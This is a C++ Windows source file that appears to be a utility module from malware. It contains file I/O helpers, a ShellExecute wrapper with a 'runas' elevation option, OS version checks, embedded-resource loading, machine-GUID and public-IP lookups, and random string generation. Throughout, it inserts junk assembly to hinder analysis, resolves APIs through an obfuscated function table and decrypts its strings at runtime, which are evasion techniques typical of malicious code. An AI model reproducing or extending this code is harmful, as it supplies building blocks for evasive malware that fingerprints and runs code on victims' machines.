#define WIN32_LEAN_AND_MEAN

#include "stdio.h"
#include <Windows.h>
#include <shellapi.h>

#include "global_config.h"
#include "functions_table.h"
#include "junk_asm.h"

#include <windows.h>
#include <stdio.h>
#include "junk_asm.h"
#include "functions_table.h"

#include "crypto.h"

#include <stdlib.h>
#include <time.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#define MSG_NOSIGNAL 0

#include <combaseapi.h>

#include "debug.h"

#include "function_table_core.h"

#include <string>
#include <wininet.h>

#pragma comment(lib, "Wininet.lib")

#include "functions_table.h"

#pragma warning(disable:4996)


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// file operations
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
char * read_file_to_buffer(char * pSourceFile) {
	HANDLE hFile = l_CreateFileA
	(
		pSourceFile,
		GENERIC_READ,
		0,
		0,
		OPEN_ALWAYS,
		0,
		0
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		DBG_MSG("Error opening %s\r\n", pSourceFile);
		return NULL;
	}

	DWORD dwSize = l_GetFileSize(hFile, 0);
	char * pBuffer = new char[dwSize];
	DWORD dwBytesRead = 0;


	l_ReadFile(hFile, (char*)pBuffer, dwSize, &dwBytesRead, 0);

	return pBuffer;
}

//
bool write_file(char* filename, char* data, int data_size) {
    ASM_JUNK;

    DBG_MSG("write_file() - begin writting file: %s.\n", filename);
    /*
    FILE* outfile = fopen(filename, "wb+");

    if (outfile == NULL) {
        DBG_MSG("write_file() - Failed to open file for writting.\n");
        return false;
    }

    int count = fwrite(data, 1, data_size, outfile);

    if (count != data_size) {
        DBG_MSG("write_file() - fwrite() failed.\n");
        return false;
    }

    //SetFileAttributesA(filename, FILE_ATTRIBUTE_HIDDEN);

    fclose(outfile);
    return true;
    */

    HANDLE hFile = NULL;
    DWORD bytes_written = 0;

    hFile = l_CreateFileA(
        filename,
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DBG_MSG("write_file() - l_CreateFileA() failed, code: %d\n", l_GetLastError());
        return FALSE;
    }

    BOOL b_rrror_flag = l_WriteFile(
        hFile,              // open file handle
        data,               // start of data to write
        data_size,          // number of bytes to write
        &bytes_written,     // number of bytes that were written
        NULL);              // no overlapped structure

    if (FALSE == b_rrror_flag)
    {
        DBG_MSG("write_file() - WriteFile() failed, code: %d\n", l_GetLastError());
        l_CloseHandle(hFile);
        return FALSE;
    }
    else {
        if (bytes_written != data_size) {
            DBG_MSG("write_file() - WriteFile(): (bytes_written != data_size) \n");
            l_CloseHandle(hFile);
            return FALSE;
        }
    }

    //
    l_CloseHandle(hFile);

    DBG_MSG("write_file() - file: %s SUCCESS.\n", filename);
    return TRUE;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// executions
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
SHELLEXECUTEINFOA * open_or_runas_executor(char* command_line, BOOL runas_flag) 
{
    ASM_JUNK;

    DBG_MSG("open_or_runas_executor() - command_line: %s\n", command_line);

    SHELLEXECUTEINFOA* sei = (SHELLEXECUTEINFOA*)calloc(1, sizeof SHELLEXECUTEINFOA);

    //
    char* runas = NULL;
    decrypt_to_string(&runas, RUNAS, RUNAS_LEN);

    DBG_MSG("open_or_runas_executor() - runas decrypted: %s\n", runas);

    //
    char* open_str = NULL;
    decrypt_to_string(&open_str, OPEN_STR, OPEN_STR_LEN);

    DBG_MSG("open_or_runas_executor() - open_str decrypted: %s\n", open_str);

    //
    sei->cbSize = sizeof(SHELLEXECUTEINFOA);
    sei->fMask = SEE_MASK_NOCLOSEPROCESS;

    if (runas_flag) {
        sei->lpVerb = runas;

        DBG_MSG("open_or_runas_executor() - RUNAS the file.\n");
    }
    else {
        sei->lpVerb = open_str;

        DBG_MSG("open_or_runas_executor() - OPEN the file.\n");
    }
    
    sei->lpFile = command_line;

    //

    l_CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    //
    bool res_shell_execute = l_ShellExecuteExA(sei);

    if (!res_shell_execute)
    {
        DBG_MSG("l_ShellExecuteExA() - failed, error code: %d\n", l_GetLastError());

        return NULL;
    }

    //
    free(runas);


    //
    l_CoUninitialize();

    //
    return sei;
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// system informations
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


BOOL Is64BitWindows()
{
    ASM_JUNK;
#if defined(_WIN64)
        return TRUE;  // 64-bit programs run only on Win64
#elif defined(_WIN32)
        // 32-bit programs run on both 32-bit and 64-bit Windows
        // so must sniff
        BOOL f64 = FALSE;


    //
    return l_IsWow64Process(l_GetCurrentProcess(), &f64) && f64;
#else
        return FALSE; // Win64 does not support Win16
#endif
}

/*
Applications not manifested for Windows 8.1 or Windows 10 will return the Windows 8 OS version value (6.2). Once an application is manifested for a given operating system version, GetVersion will 
always return the version that the application is manifested for in future releases.

https://docs.microsoft.com/en-us/windows/win32/sysinfo/version-helper-apis
*/
WORD GetVersionWord()
{
    ASM_JUNK;

    OSVERSIONINFOA verInfo = { sizeof(OSVERSIONINFOA) };

    l_GetVersionExA(&verInfo);



    return MAKEWORD(verInfo.dwMinorVersion, verInfo.dwMajorVersion);

}
BOOL IsWin8OrHigher()
{
    ASM_JUNK;
    return GetVersionWord() >= _WIN32_WINNT_WIN8;
}
BOOL IsVistaOrHigher()
{
    ASM_JUNK;
    return GetVersionWord() >= _WIN32_WINNT_VISTA;
}

//
typedef LONG * PNTSTATUS;
#define STATUS_SUCCESS (0x00000000)

typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

// return type here: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfow
RTL_OSVERSIONINFOW * GetRealOSVersion() 
{
    RTL_OSVERSIONINFOW * rovi = (RTL_OSVERSIONINFOW*)calloc(sizeof RTL_OSVERSIONINFOW, 1);
    
    if (STATUS_SUCCESS == l_RtlGetVersion(rovi)) 
    {
        return rovi;
    }

    RtlZeroMemory(rovi, sizeof RTL_OSVERSIONINFOW);
    
    return rovi;
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



void load_program_resource(char** resource_bytes, LPWSTR resource_id, DWORD* resource_size) 
{
    HRSRC hResource = l_FindResourceW(NULL, resource_id, RT_RCDATA);

    if (hResource)
    {
        HGLOBAL hLoadedResource = l_LoadResource(NULL, hResource);

        if (hLoadedResource)
        {
            LPVOID pLockedResource = l_LockResource(hLoadedResource);

            if (pLockedResource)
            {
                DWORD dwResourceSize = l_SizeofResource(NULL, hResource);

                if (0 != dwResourceSize)
                {
                    // Use pLockedResource and dwResourceSize however you want

                    *resource_bytes = (char*)calloc(dwResourceSize, 1);
                    memcpy(*resource_bytes, pLockedResource, dwResourceSize);

                    *resource_size = dwResourceSize;
                }
                else {
                    DBG_MSG("load_program_resource: SizeofResource result == 0 , error code: %d.\n", l_GetLastError());
                    return;
                }
            }
            else {
                DBG_MSG("load_program_resource: LockResource() failed, error code: %d.\n", l_GetLastError());
                return;
            }
        }
        else {
            DBG_MSG("load_program_resource: LoadResource() failed, error code: %d.\n", l_GetLastError());
            return;
        }
    }
    else {
        DBG_MSG("load_program_resource: FindResource() failed, error code: %d.\n", l_GetLastError());
        return;
    }
}








//=====================================================================================
/*
|| ::DESCRIPTION::
|| This function will convert a WCHAR string to a CHAR string.
||
|| Param 1 :: Pointer to a buffer that will contain the converted string. Ensure this
||            buffer is large enough; if not, buffer overrun errors will occur.
|| Param 2 :: Constant pointer to a source WCHAR string to be converted to CHAR
*/
void wtoc(CHAR* Dest, const WCHAR* Source)
{
    int i = 0;

    while (Source[i] != '\0')
    {
        Dest[i] = (CHAR)Source[i];
        ++i;
    }
}

//
bool get_pc_guid(char * value)
{
    DWORD BufferSize = sizeof(value);
    LONG res = l_RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, value, &BufferSize);
    
    if (res == 0)
    {
        DBG_MSG("get_pc_guid() success. - value: %s \n", value);

        return true;
    }
    
    value = NULL;
    DBG_MSG("get_pc_guid() failed- error code: %d \n", res);

    return false;
}

//

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//By Napalm




// I will let you add the error checking to this function.
char* getwebpage(char* hostname, char* uri, unsigned long* total)
{
    if (!hostname || !uri || !total) return (char*)0;
    *total = 0;

    char* headers1 = NULL;

    decrypt_to_string(&headers1, HEADER_STR, HEADER_STR_LEN);

    char* headers2 = (char*)calloc(strlen(headers1) + strlen(hostname) + 2, 1);

    sprintf(headers2, "%s%s\n", headers1, hostname);

    free(headers1);

    char* decrypted_str_1 = NULL;

    decrypt_to_string(&decrypted_str_1, USER_AGENT_STR, USER_AGENT_STR_LEN);

    HINTERNET session = l_InternetOpenA(decrypted_str_1, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    free(decrypted_str_1);


    HINTERNET connect = l_InternetConnectA(session, hostname, 80, "", "", INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET http = l_HttpOpenRequestA(connect, "GET", uri, HTTP_VERSIONA, NULL, 0, INTERNET_FLAG_DONT_CACHE, 0);
    l_HttpSendRequestA(http, headers2, strlen(headers2), NULL, 0);
    free(headers2);

    unsigned long read;
    char buffer[1024];
    char* final = (char*)calloc(1024, 1);

    memset(buffer, 0, 1024);

    while (l_InternetReadFile(http, buffer, 1024, &read) && (read != 0)) {
        CopyMemory((final + *total), buffer, read);
        *total += read;
        final = (char*)realloc(final, (*total + 1024));
        memset((final + *total), 0, 1024);
    }

    l_InternetCloseHandle(http);
    l_InternetCloseHandle(connect);
    l_InternetCloseHandle(session);

    return final;
}

bool getmyipaddress(char* buffer)
{
    unsigned long length;

    char* decrypted_str_1 = NULL;

    decrypt_to_string(&decrypted_str_1, GET_IP_STR, GET_IP_STR_LEN);

    char* webpage = getwebpage(decrypted_str_1, "/", &length);

    free(decrypted_str_1);

    if (!webpage || length == 0) return 0;
    bool result = false;
    char* start = strstr(webpage, "<b>");

    //
    if (start) {
        start += 3;
        while (*start <= ' ') start++;
        char* end = start;
        while (*end > ' ') end++;
        *end = 0;

        //
        for (int i = 0; i < strlen(start); i++) {
            if (start[i] == '<') {
                start[i] = '\0';
                break;
            }
        }

        strncpy(buffer, start, strlen(start));
        result = true;
    }

    // failure case, but we don't take it as a failure.
    else {
        strcpy(buffer, "0.0.0.0");
    }
    
    
    //
    free(webpage);
    return result;
}

////////////////////////////////////////////////////////////////////////////////
static const char alphanum[] = "0123456789" "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

static char gen_alpha_num_char() { // Random string generator function.
    int len = sizeof(alphanum) - 1;

    return alphanum[rand() % len];
}

char * generate_alpha_numeric_string(int len) 
{
    char* ret = (char*)calloc(len+1, 1);

    srand(time(0));

    for (int i = 0; i < len; i++) {
        ret[i] = gen_alpha_num_char();
    }


    // free it yourself.
    return ret;
}



